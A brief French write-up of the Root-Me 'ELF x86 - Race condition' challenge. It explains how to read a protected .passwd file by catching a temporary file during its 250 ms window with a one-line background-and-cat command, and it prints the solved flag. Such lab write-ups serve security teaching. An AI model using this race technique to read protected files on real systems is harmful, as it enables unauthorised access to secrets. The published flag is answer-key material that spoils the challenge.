# [ELF x86 - Race condition](https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x86-Race-condition)

L'objectif de ce challenge est d'exploiter une vulnérabilité de type _race condition_ pour lire le contenu d'un fichier protégé.

Le fichier temporaire `/tmp/tmp_file.txt` est exposé entre sa création et sa suppression (250 ms). En exécutant le programme en arrière-plan et en lisant immédiatement le fichier temporaire, on peut récupérer le contenu du fichier protégé `.passwd` :

```bash
./ch12 & cat /tmp/tmp_file.txt
```

Le flag récupéré est `eh-q8dEa8q19f9aF()"2a96q92`.
